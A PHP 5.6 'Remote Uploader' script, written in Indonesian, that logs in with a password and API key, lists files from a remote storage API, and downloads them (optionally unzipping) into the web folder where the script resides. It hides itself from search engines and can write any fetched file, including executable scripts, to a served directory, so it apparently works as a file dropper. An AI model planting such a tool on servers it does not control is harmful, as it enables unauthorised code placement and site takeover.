function ru_unzip_here($zipPath, $destination, $overwrite, $progress)
{
    if (!class_exists('ZipArchive')) {
        throw new RuntimeException('Ekstensi PHP ZipArchive belum aktif.');
    }
    $zip = new ZipArchive();
    $opened = $zip->open($zipPath);
    if ($opened !== true) {
        throw new RuntimeException('ZIP tidak dapat dibuka. Kode ZipArchive: ' . $opened);
    }
    $totalEntries = (int) $zip->numFiles;
    if ($totalEntries < 1) {
        $zip->close();
        throw new RuntimeException('ZIP tidak memiliki isi.');
    }
    if ($totalEntries > MAX_ZIP_ENTRIES) {
        $zip->close();
        throw new RuntimeException('Jumlah entry ZIP melebihi batas ' . MAX_ZIP_ENTRIES . '.');
    }

    $entries = array();
    $totalBytes = 0.0;
    $seen = array();
    for ($i = 0; $i < $totalEntries; $i++) {
        $name = $zip->getNameIndex($i);
        if ($name === false) {
            $zip->close();
            throw new RuntimeException('Nama entry ZIP tidak dapat dibaca.');
        }
        if (ru_zip_entry_is_symlink($zip, $i)) {
            $zip->close();
            throw new RuntimeException('ZIP mengandung symbolic link dan ditolak.');
        }
        $relative = ru_zip_entry_path($name);
        $key = strtolower(str_replace('\\', '/', rtrim($relative, DIRECTORY_SEPARATOR)));
        if (isset($seen[$key])) {
            $zip->close();
            throw new RuntimeException('ZIP mempunyai entry duplikat: ' . $name);
        }
        $seen[$key] = true;
        $stat = $zip->statIndex($i);
        $size = is_array($stat) ? (float) ru_array_get($stat, 'size', 0) : 0;
        $totalBytes += $size;
        if ($totalBytes > MAX_UNCOMPRESSED_ZIP_BYTES) {
            $zip->close();
            throw new RuntimeException('Hasil ekstraksi ZIP diperkirakan melebihi 4 GB.');
        }
        $entries[] = array('index' => $i, 'name' => $name, 'relative' => $relative, 'size' => $size);
    }

    $extracted = 0;
    $skipped = 0;
    foreach ($entries as $position => $entry) {
        $relative = $entry['relative'];
        if (is_callable($progress)) {
            call_user_func($progress, 'extracting', $position, $totalEntries, str_replace(DIRECTORY_SEPARATOR, '/', $relative));
        }
        $target = ru_path_inside_root($destination, rtrim($relative, DIRECTORY_SEPARATOR));
        if (ru_string_ends_with($relative, DIRECTORY_SEPARATOR)) {
            if (!is_dir($target) && !@mkdir($target, 0755, true) && !is_dir($target)) {
                $zip->close();
                throw new RuntimeException('Folder ZIP tidak dapat dibuat: ' . $relative);
            }
            continue;
        }
        if (basename($target) === basename(__FILE__)) {
            $skipped++;
            continue;
        }
        if (file_exists($target) && !$overwrite) {
            $skipped++;
            continue;
        }
        if (is_dir($target)) {
            $zip->close();
            throw new RuntimeException('Konflik path: target file merupakan folder: ' . $relative);
        }
        $stream = $zip->getStream($entry['name']);
        if ($stream === false) {
            $zip->close();
            throw new RuntimeException('Entry ZIP tidak dapat dibaca: ' . $entry['name']);
        }
        $temp = dirname($target) . DIRECTORY_SEPARATOR . '.' . basename($target) . '.extract-' . bin2hex(ru_random_bytes_legacy(5));
        $out = @fopen($temp, 'wb');
        if ($out === false) {
            @fclose($stream);
            $zip->close();
            throw new RuntimeException('File hasil ekstraksi tidak dapat dibuat: ' . $relative);
        }
        $written = stream_copy_to_stream($stream, $out);
        fclose($stream);
        fclose($out);
        if ($written === false || (float) $written != (float) $entry['size']) {
            @unlink($temp);
            $zip->close();
            throw new RuntimeException('Ukuran hasil ekstraksi tidak cocok: ' . $relative);
        }
        if (file_exists($target) && $overwrite && !@unlink($target)) {
            @unlink($temp);
            $zip->close();
            throw new RuntimeException('File lama tidak dapat ditimpa: ' . $relative);
        }
        if (!@rename($temp, $target)) {
            @unlink($temp);
            $zip->close();
            throw new RuntimeException('Hasil ekstraksi tidak dapat dipindahkan: ' . $relative);
        }
        @chmod($target, 0644);
        $extracted++;
    }
    if (is_callable($progress)) {
        call_user_func($progress, 'done', $totalEntries, $totalEntries, 'Selesai');
    }
    $zip->close();
    return array('extracted' => $extracted, 'skipped' => $skipped, 'entries' => $totalEntries, 'bytes' => $totalBytes);
}

function ru_validate_folder_slug($slug)
{
    $slug = strtolower(trim((string) $slug));
    return preg_match('/^[a-z0-9][a-z0-9-]{0,119}$/', $slug) ? $slug : '';
}

function ru_find_file_in_folder($folderSlug, $fileId, $apiKey)
{
    $folderData = ru_api_json('/folders/' . rawurlencode($folderSlug) . '/files', $apiKey);
    $files = ru_array_get($folderData, 'files', array());
    if (!is_array($files)) {
        $files = array();
    }
    foreach ($files as $file) {
        if (is_array($file) && (int) ru_array_get($file, 'id', 0) === (int) $fileId) {
            return $file;
        }
    }
    throw new RuntimeException('File tidak ditemukan pada folder sumber.');
}

$action = isset($_POST['action']) ? (string) $_POST['action'] : '';

if ($action === 'progress') {
    try {
        if (!ru_authenticated()) {
            throw new RuntimeException('Sesi login sudah berakhir.');
        }
        ru_verify_csrf();
        $jobId = ru_validate_job_id(isset($_POST['job_id']) ? $_POST['job_id'] : '');
        $data = ru_read_progress($jobId, ru_progress_owner());
        ru_json_response(array('ok' => true, 'data' => $data), 200);
    } catch (Exception $error) {
        ru_json_response(array('ok' => false, 'error' => $error->getMessage()), 400);
    }
}

if ($action === 'process_file') {
    try {
        if (!ru_authenticated()) {
            throw new RuntimeException('Sesi login sudah berakhir.');
        }
        ru_verify_csrf();
        $jobId = ru_validate_job_id(isset($_POST['job_id']) ? $_POST['job_id'] : '');
        $owner = ru_progress_owner();
        $folderSlug = ru_validate_folder_slug(isset($_POST['folder_slug']) ? $_POST['folder_slug'] : '');
        $fileId = isset($_POST['file_id']) ? (int) $_POST['file_id'] : 0;
        $transferMode = isset($_POST['transfer_mode']) ? (string) $_POST['transfer_mode'] : 'upload';
        $overwrite = !empty($_POST['overwrite']);
        $apiKey = (string) $_SESSION['ru_api_key'];
        if ($folderSlug === '' || $fileId < 1) {
            throw new RuntimeException('Folder atau file tidak valid.');
        }
        if ($transferMode !== 'upload' && $transferMode !== 'upload_unzip') {
            throw new RuntimeException('Mode transfer tidak valid.');
        }
        $file = ru_find_file_in_folder($folderSlug, $fileId, $apiKey);
        $displayName = basename((string) ru_array_get($file, 'name', 'file-' . $fileId));
        $extension = strtolower((string) ru_array_get($file, 'extension', pathinfo($displayName, PATHINFO_EXTENSION)));
        $expectedBytes = (float) ru_array_get($file, 'size_bytes', 0);
        $downloadUrl = (string) ru_array_get($file, 'download_url', '');
        $filename = ru_safe_remote_filename($displayName, $extension);
        if ($transferMode === 'upload_unzip' && $extension !== 'zip') {
            $transferMode = 'upload';
        }
        if ($expectedBytes > MAX_SINGLE_FILE_BYTES) {
            throw new RuntimeException('File melebihi batas ' . ru_human_bytes(MAX_SINGLE_FILE_BYTES) . '.');
        }
        if (!is_dir(DESTINATION_ROOT) || !is_writable(DESTINATION_ROOT)) {
            throw new RuntimeException('Folder tempat uploader berada tidak writable.');
        }

        ru_write_progress($jobId, $owner, array(
            'status' => 'running',
            'stage' => 'Menyiapkan ' . $filename,
            'filename' => $filename,
            'percent' => 1,
            'downloaded_bytes' => 0,
            'total_bytes' => $expectedBytes
        ));

        session_write_close();
        @ignore_user_abort(true);
        @set_time_limit(0);

        $tempPath = DESTINATION_ROOT . DIRECTORY_SEPARATOR . '.' . $filename . '.part-' . bin2hex(ru_random_bytes_legacy(6));
        $finalPath = DESTINATION_ROOT . DIRECTORY_SEPARATOR . $filename;
        $method = null;

        $downloadProgress = function ($downloaded, $total) use ($jobId, $owner, $filename) {
            $percent = $total > 0 ? (int) floor(($downloaded / $total) * 82) : 5;
            ru_write_progress($jobId, $owner, array(
                'status' => 'running',
                'stage' => 'Mengunduh ' . $filename,
                'filename' => $filename,
                'percent' => max(2, min(82, $percent)),
                'downloaded_bytes' => $downloaded,
                'total_bytes' => $total
            ));
        };
        $stageProgress = function ($message) use ($jobId, $owner, $filename, $expectedBytes) {
            ru_write_progress($jobId, $owner, array(
                'status' => 'running',
                'stage' => $message,
                'filename' => $filename,
                'percent' => 3,
                'downloaded_bytes' => 0,
                'total_bytes' => $expectedBytes
            ));
        };

        try {
            $actual = ru_download_file($downloadUrl, $apiKey, $tempPath, $expectedBytes, $downloadProgress, $method, $stageProgress);
            ru_write_progress($jobId, $owner, array(
                'status' => 'running',
                'stage' => 'Menyimpan file hasil download',
                'filename' => $filename,
                'percent' => 86,
                'downloaded_bytes' => $actual,
                'total_bytes' => $actual
            ));
            if (file_exists($finalPath)) {
                if (!$overwrite) {
                    @unlink($tempPath);
                    ru_write_progress($jobId, $owner, array('status' => 'skipped', 'stage' => 'File sudah ada dan dilewati', 'percent' => 100));
                    ru_json_response(array('ok' => true, 'status' => 'skipped', 'message' => $filename . ': dilewati karena sudah ada.'), 200);
                }
                if (!@unlink($finalPath)) {
                    throw new RuntimeException('File lama tidak dapat ditimpa.');
                }
            }
            if (!@rename($tempPath, $finalPath)) {
                throw new RuntimeException('File sementara tidak dapat dipindahkan ke tujuan.');
            }
            @chmod($finalPath, 0644);

            $message = $filename . ': upload berhasil via ' . ($method ? $method : 'metode tidak diketahui') . ' → ' . ru_public_url($filename);
            $unzipData = null;
            if ($transferMode === 'upload_unzip') {
                ru_write_progress($jobId, $owner, array('status' => 'running', 'stage' => 'Memeriksa dan mengekstrak ZIP', 'percent' => 88));
                $unzipProgress = function ($phase, $current, $total, $entry) use ($jobId, $owner, $filename) {
                    $ratio = $total > 0 ? $current / $total : 0;
                    $percent = 88 + (int) floor($ratio * 11);
                    ru_write_progress($jobId, $owner, array(
                        'status' => 'running',
                        'stage' => $phase === 'done' ? 'Ekstraksi selesai' : 'Unzip: ' . $entry,
                        'filename' => $filename,
                        'percent' => max(88, min(99, $percent)),
                        'unzip_current' => $current,
                        'unzip_total' => $total
                    ));
                };
                $unzipData = ru_unzip_here($finalPath, DESTINATION_ROOT, $overwrite, $unzipProgress);
                $message .= ' | unzip berhasil: ' . $unzipData['extracted'] . ' file diekstrak, ' . $unzipData['skipped'] . ' dilewati.';
            }
            ru_write_progress($jobId, $owner, array('status' => 'done', 'stage' => 'Selesai', 'percent' => 100, 'message' => $message));
            ru_json_response(array('ok' => true, 'status' => 'done', 'message' => $message, 'method' => $method, 'unzip' => $unzipData), 200);
        } catch (Exception $error) {
            @unlink($tempPath);
            ru_write_progress($jobId, $owner, array('status' => 'failed', 'stage' => 'Gagal', 'percent' => 100, 'error' => $error->getMessage()));
            ru_json_response(array('ok' => false, 'status' => 'failed', 'error' => $error->getMessage()), 500);
        }
    } catch (Exception $error) {
        ru_json_response(array('ok' => false, 'status' => 'failed', 'error' => $error->getMessage()), 400);
    }
}

try {
    if ($action === 'logout') {
        ru_verify_csrf();
        ru_logout();
        ru_redirect(array());
    }

    if ($action === 'login') {
        ru_verify_csrf();
        $blockedUntil = isset($_SESSION['ru_blocked_until']) ? (int) $_SESSION['ru_blocked_until'] : 0;
        if ($blockedUntil > time()) {
            throw new RuntimeException('Terlalu banyak percobaan. Coba lagi dalam ' . ($blockedUntil - time()) . ' detik.');
        }
        $password = isset($_POST['security_password']) ? (string) $_POST['security_password'] : '';
        $apiKey = isset($_POST['api_key']) ? trim((string) $_POST['api_key']) : '';
        if (!password_verify($password, DASHBOARD_PASSWORD_HASH)) {
            throw new RuntimeException('Security password salah.');
        }
        if (!preg_match('/^dc_live_[a-f0-9]{64}$/', $apiKey)) {
            throw new RuntimeException('Format API key tidak valid.');
        }
        ru_api_json('/ping', $apiKey);
        session_regenerate_id(true);
        $_SESSION['ru_authenticated'] = true;
        $_SESSION['ru_api_key'] = $apiKey;
        $_SESSION['ru_attempts'] = 0;
        unset($_SESSION['ru_blocked_until']);
        ru_redirect(array());
    }
} catch (Exception $error) {
    if ($action === 'login') {
        $attempts = isset($_SESSION['ru_attempts']) ? (int) $_SESSION['ru_attempts'] + 1 : 1;
        $_SESSION['ru_attempts'] = $attempts;
        if ($attempts >= 5) {
            $_SESSION['ru_blocked_until'] = time() + 300;
            $_SESSION['ru_attempts'] = 0;
        }
    }
    ru_flash('error', $error->getMessage());
    ru_redirect(array());
}

$flashes = ru_pull_flashes();
$folders = array();
$files = array();
$currentFolder = null;
$pageError = '';
$selectedFolderSlug = isset($_GET['folder']) ? ru_validate_folder_slug($_GET['folder']) : '';

if (ru_authenticated()) {
    try {
        $apiKey = (string) $_SESSION['ru_api_key'];
        $folderResponse = ru_api_json('/folders', $apiKey);
        $foldersValue = ru_array_get($folderResponse, 'folders', array());
        $folders = is_array($foldersValue) ? $foldersValue : array();
        if ($selectedFolderSlug !== '') {
            $fileResponse = ru_api_json('/folders/' . rawurlencode($selectedFolderSlug) . '/files', $apiKey);
            $folderValue = ru_array_get($fileResponse, 'folder', null);
            $filesValue = ru_array_get($fileResponse, 'files', array());
            $currentFolder = is_array($folderValue) ? $folderValue : null;
            $files = is_array($filesValue) ? $filesValue : array();
        }
    } catch (Exception $error) {
        $pageError = $error->getMessage();
    }
}

$zipAvailable = class_exists('ZipArchive');
$curlAvailable = function_exists('curl_init');
$wgetAvailable = ru_wget_supported();
$destinationWritable = is_dir(DESTINATION_ROOT) && is_writable(DESTINATION_ROOT);
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>DC Remote Uploader Legacy</title>
<style>
:root{--bg:#07110d;--panel:#0e1d16;--panel2:#13271d;--line:rgba(119,255,180,.16);--text:#eefcf4;--muted:#91aa9b;--green:#38e888;--green2:#83ffb4;--red:#ff6b77;--yellow:#ffd76a;--shadow:0 24px 70px rgba(0,0,0,.35)}*{box-sizing:border-box}body{margin:0;min-height:100vh;background:radial-gradient(circle at 15% 0,rgba(56,232,136,.14),transparent 30%),linear-gradient(145deg,#06100c,#091610 55%,#06100c);color:var(--text);font-family:Inter,Arial,sans-serif}.wrap{width:min(1180px,calc(100% - 28px));margin:28px auto}.top,.card{border:1px solid var(--line);background:linear-gradient(145deg,rgba(19,39,29,.94),rgba(9,23,16,.96));box-shadow:var(--shadow);border-radius:22px}.top{display:flex;justify-content:space-between;align-items:center;padding:18px 20px;margin-bottom:18px}.brand{display:flex;gap:13px;align-items:center}.logo{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;background:linear-gradient(145deg,var(--green2),var(--green));color:#052313;font-weight:900;box-shadow:0 0 30px rgba(56,232,136,.25)}h1,h2,p{margin:0}.brand strong{display:block;font-size:17px}.brand small,.muted{color:var(--muted)}.version{display:inline-block;margin-left:7px;padding:4px 8px;border:1px solid rgba(56,232,136,.3);border-radius:999px;color:var(--green2);font-size:10px}.card{padding:22px;margin-bottom:18px}.login{max-width:500px;margin:8vh auto}.login h1{font-size:28px;margin-bottom:8px}.field{margin-top:16px}.field label{display:block;margin-bottom:7px;font-size:13px;color:#c6ddcf}.input,select{width:100%;border:1px solid var(--line);background:#07140d;color:var(--text);padding:13px 14px;border-radius:12px;outline:none}.input:focus,select:focus{border-color:rgba(56,232,136,.65);box-shadow:0 0 0 3px rgba(56,232,136,.09)}.btn{border:0;border-radius:12px;padding:12px 16px;font-weight:800;cursor:pointer;background:linear-gradient(145deg,var(--green2),var(--green));color:#052313}.btn:hover{filter:brightness(1.06)}.btn.secondary{background:#172b21;color:var(--text);border:1px solid var(--line)}.btn.danger{background:rgba(255,107,119,.12);color:#ff9ca4;border:1px solid rgba(255,107,119,.24)}.btn:disabled{opacity:.45;cursor:not-allowed}.full{width:100%;margin-top:18px}.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}.status-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}.status{padding:14px;border-radius:14px;background:rgba(6,16,12,.7);border:1px solid var(--line)}.status b{display:block;font-size:12px;margin-bottom:5px}.ok{color:var(--green2)}.bad{color:var(--red)}.notice{padding:13px 15px;border-radius:13px;margin-bottom:14px;border:1px solid rgba(255,107,119,.25);background:rgba(255,107,119,.1);color:#ffc2c7}.notice.success{border-color:rgba(56,232,136,.25);background:rgba(56,232,136,.08);color:#b8ffd2}.toolbar{display:flex;gap:12px;align-items:end}.toolbar .grow{flex:1}.table-wrap{overflow:auto;border:1px solid var(--line);border-radius:15px;margin-top:16px}table{width:100%;border-collapse:collapse;min-width:820px}th,td{text-align:left;padding:13px 14px;border-bottom:1px solid var(--line);font-size:13px}th{color:#bcd1c3;background:rgba(7,20,13,.65)}tr:last-child td{border-bottom:0}.file{font-weight:750}.sub{display:block;color:var(--muted);font-size:11px;margin-top:4px}.badge{padding:4px 8px;border-radius:999px;background:rgba(56,232,136,.1);color:var(--green2);font-size:10px}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;align-items:center}.checkline{display:flex;gap:8px;align-items:center;color:#c6ddcf;font-size:13px}.progress-panel{display:none;margin-top:18px}.progress-panel.show{display:block}.progress-title{display:flex;justify-content:space-between;gap:10px;margin:10px 0 7px}.bar{height:13px;border-radius:999px;overflow:hidden;background:#06100c;border:1px solid var(--line)}.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--green),var(--green2));transition:width .2s}.queue{margin-top:14px;display:grid;gap:8px}.queue-item{display:grid;grid-template-columns:minmax(0,1fr) 105px;gap:10px;padding:11px 12px;border-radius:12px;background:rgba(6,16,12,.65);border:1px solid var(--line)}.queue-state{text-align:right;color:var(--muted)}.queue-item.done .queue-state{color:var(--green2)}.queue-item.failed .queue-state{color:var(--red)}.log{margin-top:13px;padding:13px;min-height:90px;max-height:260px;overflow:auto;background:#050c08;border:1px solid var(--line);border-radius:13px;font:12px/1.6 Consolas,monospace;white-space:pre-wrap;color:#b9d6c4}@media(max-width:800px){.grid,.status-grid{grid-template-columns:1fr}.toolbar{align-items:stretch;flex-direction:column}.top{align-items:flex-start;gap:12px;flex-direction:column}}
</style>
</head>
<body>
<?php if (!ru_authenticated()): ?>
<div class="wrap"><div class="card login">
<div class="brand" style="margin-bottom:20px"><span class="logo">DC</span><div><strong>Remote Uploader <span class="version">PHP 5.6 LEGACY</span></strong><small>dc.bajak.team → folder script ini</small></div></div>
<h1>Security Check</h1><p class="muted">Masukkan password dashboard dan API key read-only.</p>
<?php foreach ($flashes as $flash): ?><div class="notice" style="margin-top:15px"><?= ru_e(ru_array_get($flash, 'message', '')) ?></div><?php endforeach; ?>
<form method="post" action="<?= ru_e(RU_SELF) ?>">
<input type="hidden" name="action" value="login"><input type="hidden" name="csrf_token" value="<?= ru_e(ru_csrf_token()) ?>">
<div class="field"><label>Security Password</label><input class="input" type="password" name="security_password" required autocomplete="current-password"></div>
<div class="field"><label>DC API Key</label><input class="input" type="password" name="api_key" required placeholder="dc_live_..." autocomplete="off"></div>
<button class="btn full" type="submit">Masuk ke Remote Uploader</button>
</form></div></div>
<?php else: ?>
<div class="wrap">
<div class="top"><div class="brand"><span class="logo">DC</span><div><strong>Remote Uploader <span class="version">V8 PHP 5.6</span></strong><small><?= ru_e(parse_url(DC_API_BASE_URL, PHP_URL_HOST)) ?> → <?= ru_e(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'remote') ?></small></div></div><form method="post"><input type="hidden" name="action" value="logout"><input type="hidden" name="csrf_token" value="<?= ru_e(ru_csrf_token()) ?>"><button class="btn danger" type="submit">Keluar</button></form></div>
<?php foreach ($flashes as $flash): ?><div class="notice"><?= ru_e(ru_array_get($flash, 'message', '')) ?></div><?php endforeach; ?>
<?php if ($pageError !== ''): ?><div class="notice"><?= ru_e($pageError) ?></div><?php endif; ?>
<div class="card"><div class="status-grid">
<div class="status"><b>PHP Aktif</b><span class="<?= version_compare(PHP_VERSION,'5.6.0','>=')?'ok':'bad' ?>"><?= ru_e(PHP_VERSION) ?></span></div>
<div class="status"><b>ZipArchive</b><span class="<?= $zipAvailable?'ok':'bad' ?>"><?= $zipAvailable?'Aktif':'Tidak aktif' ?></span></div>
<div class="status"><b>Metode Download</b><span class="ok"><?= $curlAvailable?'cURL → ':'' ?>file_get_contents<?= $wgetAvailable?' → wget':'' ?></span></div>
<div class="status"><b>Folder Tujuan</b><span class="<?= $destinationWritable?'ok':'bad' ?>"><?= $destinationWritable?'Writable':'Tidak writable' ?></span></div>
</div></div>
<div class="card"><form method="get" class="toolbar"><div class="grow"><label class="muted" style="display:block;margin-bottom:7px">Pilih folder storage</label><select name="folder" onchange="this.form.submit()"><option value="">— Pilih folder —</option><?php foreach ($folders as $folder): $slug=(string)ru_array_get($folder,'slug',''); ?><option value="<?= ru_e($slug) ?>" <?= $selectedFolderSlug===$slug?'selected':'' ?>><?= ru_e(ru_array_get($folder,'name',$slug)) ?> (<?= ru_e(ru_array_get($folder,'file_count',0)) ?> file)</option><?php endforeach; ?></select></div><noscript><button class="btn" type="submit">Tampilkan</button></noscript></form></div>
<div class="card">
<div style="display:flex;justify-content:space-between;gap:12px;align-items:center"><div><h2><?= $currentFolder?ru_e(ru_array_get($currentFolder,'name','Daftar File')):'Daftar File' ?></h2><p class="muted" style="margin-top:6px"><?= $currentFolder?ru_e(ru_array_get($currentFolder,'list_url','')):'Pilih folder untuk melihat file.' ?></p></div><?php if (count($files)>0): ?><button type="button" class="btn secondary" id="select-all">Pilih Semua</button><?php endif; ?></div>
<?php if (count($files)>0): ?><div class="table-wrap"><table><thead><tr><th></th><th>File</th><th>Tipe</th><th>Ukuran</th><th>Dibuat</th><th>Status</th></tr></thead><tbody><?php foreach ($files as $file): $fid=(int)ru_array_get($file,'id',0); ?><tr><td><input class="file-checkbox" type="checkbox" value="<?= $fid ?>" data-name="<?= ru_e(ru_array_get($file,'name','file-'.$fid)) ?>" data-size="<?= ru_e(ru_array_get($file,'size_bytes',0)) ?>"></td><td><span class="file"><?= ru_e(ru_array_get($file,'name','')) ?></span><span class="sub"><?= ru_e(ru_array_get($file,'original_name','')) ?></span></td><td><span class="badge"><?= ru_e(strtoupper((string)ru_array_get($file,'extension',''))) ?></span></td><td><?= ru_e(ru_human_bytes(ru_array_get($file,'size_bytes',0))) ?></td><td><?= ru_e(ru_array_get($file,'created_at','')) ?></td><td><span id="state-<?= $fid ?>" class="muted">Siap</span></td></tr><?php endforeach; ?></tbody></table></div>
<div class="actions"><label class="checkline"><input type="checkbox" id="overwrite"> Timpa file yang sudah ada</label><button type="button" class="btn" id="upload-btn">Upload</button><button type="button" class="btn secondary" id="unzip-btn" <?= $zipAvailable?'':'disabled' ?>>Upload &amp; Unzip Here</button><button type="button" class="btn danger" id="stop-btn" style="display:none">Berhenti Setelah File Ini</button></div>
<?php if (!$zipAvailable): ?><div class="notice" style="margin-top:14px">ZipArchive belum aktif. Upload biasa tetap dapat digunakan.</div><?php endif; ?>
<div class="progress-panel" id="progress-panel"><div class="progress-title"><b id="stage-text">Menyiapkan antrean</b><span id="file-percent">0%</span></div><div class="bar"><span id="file-bar"></span></div><div class="progress-title"><span class="muted">Progress keseluruhan</span><span id="total-percent">0%</span></div><div class="bar"><span id="total-bar"></span></div><div class="queue" id="queue"></div><div class="log" id="log"></div></div>
<?php else: ?><div class="notice" style="margin-top:16px">Folder ini belum memiliki file.</div><?php endif; ?>
</div></div>
<script>
(function(){
var folderSlug=<?= json_encode($selectedFolderSlug) ?>;
var csrf=<?= json_encode(ru_csrf_token()) ?>;
var selfUrl=<?= json_encode(RU_SELF) ?>;
var running=false,stopAfter=false;
function byId(id){return document.getElementById(id)}
function selected(){var out=[],boxes=document.querySelectorAll('.file-checkbox:checked');for(var i=0;i<boxes.length;i++){out.push({id:boxes[i].value,name:boxes[i].getAttribute('data-name'),size:parseFloat(boxes[i].getAttribute('data-size')||'0')})}return out}
function jobId(){var a=new Uint8Array(16);if(window.crypto&&window.crypto.getRandomValues){window.crypto.getRandomValues(a)}else{for(var i=0;i<a.length;i++)a[i]=Math.floor(Math.random()*256)}var s='';for(var j=0;j<a.length;j++)s+=('0'+a[j].toString(16)).slice(-2);return s}
function encode(data){var p=[];for(var k in data){if(data.hasOwnProperty(k))p.push(encodeURIComponent(k)+'='+encodeURIComponent(data[k]))}return p.join('&')}
function post(data,done){var x=new XMLHttpRequest();x.open('POST',selfUrl,true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');x.onreadystatechange=function(){if(x.readyState===4){var j=null;try{j=JSON.parse(x.responseText)}catch(e){j={ok:false,error:'Respons PHP tidak valid. HTTP '+x.status}}done(j,x.status)}};x.send(encode(data))}
function setBar(id,p){p=Math.max(0,Math.min(100,parseInt(p||0,10)));byId(id).style.width=p+'%'}
function log(text){var el=byId('log');el.textContent+=(el.textContent?'\n':'')+text;el.scrollTop=el.scrollHeight}
function rowState(id,text,cls){var el=byId('state-'+id);if(el){el.textContent=text;el.className=cls||'muted'}}
function queueItem(item,index){var div=document.createElement('div');div.className='queue-item';div.id='queue-'+item.id;div.innerHTML='<div><b>'+(index+1)+'. '+item.name.replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})+'</b><span class="sub">Menunggu giliran</span></div><div class="queue-state">Siap</div>';return div}
function updateQueue(id,state,detail,klass){var el=byId('queue-'+id);if(!el)return;el.className='queue-item '+(klass||'');el.querySelector('.queue-state').textContent=state;el.querySelector('.sub').textContent=detail||''}
function run(mode){if(running)return;var items=selected();if(!items.length){alert('Pilih minimal satu file.');return}if(items.length>200){alert('Maksimal 200 file per antrean.');return}running=true;stopAfter=false;byId('progress-panel').className='progress-panel show';byId('queue').innerHTML='';byId('log').textContent='';for(var i=0;i<items.length;i++)byId('queue').appendChild(queueItem(items[i],i));byId('upload-btn').disabled=true;byId('unzip-btn').disabled=true;byId('stop-btn').style.display='inline-block';var completed=0;
function next(index){if(index>=items.length||stopAfter){finish(index>=items.length?'Antrean selesai':'Antrean dihentikan');return}var item=items[index],jid=jobId(),poller=null;updateQueue(item.id,'Memproses','Menghubungi server…','');rowState(item.id,'Memproses','ok');byId('stage-text').textContent='Memproses '+item.name;setBar('file-bar',1);byId('file-percent').textContent='1%';
poller=setInterval(function(){post({action:'progress',csrf_token:csrf,job_id:jid},function(j){if(j&&j.ok&&j.data){var p=parseInt(j.data.percent||0,10);setBar('file-bar',p);byId('file-percent').textContent=p+'%';byId('stage-text').textContent=j.data.stage||'Memproses';updateQueue(item.id,'Memproses',(j.data.stage||'')+' — '+p+'%','');var total=Math.floor(((completed+p/100)/items.length)*100);setBar('total-bar',total);byId('total-percent').textContent=total+'%'}})},700);
post({action:'process_file',csrf_token:csrf,job_id:jid,folder_slug:folderSlug,file_id:item.id,transfer_mode:mode,overwrite:byId('overwrite').checked?'1':''},function(j){clearInterval(poller);completed++;setBar('file-bar',100);byId('file-percent').textContent='100%';var total=Math.floor((completed/items.length)*100);setBar('total-bar',total);byId('total-percent').textContent=total+'%';if(j&&j.ok){var skipped=j.status==='skipped';updateQueue(item.id,skipped?'Dilewati':'Selesai',j.message||'',skipped?'':'done');rowState(item.id,skipped?'Dilewati':'Selesai',skipped?'muted':'ok');log((skipped?'[SKIP] ':'[OK] ')+(j.message||item.name))}else{var err=j&&j.error?j.error:'Kesalahan tidak diketahui';updateQueue(item.id,'Gagal',err,'failed');rowState(item.id,'Gagal','bad');log('[GAGAL] '+item.name+': '+err)}setTimeout(function(){next(index+1)},250)})}
function finish(text){running=false;byId('stage-text').textContent=text;byId('upload-btn').disabled=false;byId('unzip-btn').disabled=<?= $zipAvailable?'false':'true' ?>;byId('stop-btn').style.display='none';log(text)}next(0)}
var selectAll=byId('select-all');if(selectAll)selectAll.onclick=function(){var boxes=document.querySelectorAll('.file-checkbox'),all=true;for(var i=0;i<boxes.length;i++)if(!boxes[i].checked)all=false;for(var j=0;j<boxes.length;j++)boxes[j].checked=!all;this.textContent=all?'Pilih Semua':'Batalkan Semua'};
if(byId('upload-btn'))byId('upload-btn').onclick=function(){run('upload')};if(byId('unzip-btn'))byId('unzip-btn').onclick=function(){run('upload_unzip')};if(byId('stop-btn'))byId('stop-btn').onclick=function(){stopAfter=true;this.disabled=true;this.textContent='Akan berhenti…'};
})();
</script>
<?php endif; ?>
</body></html>
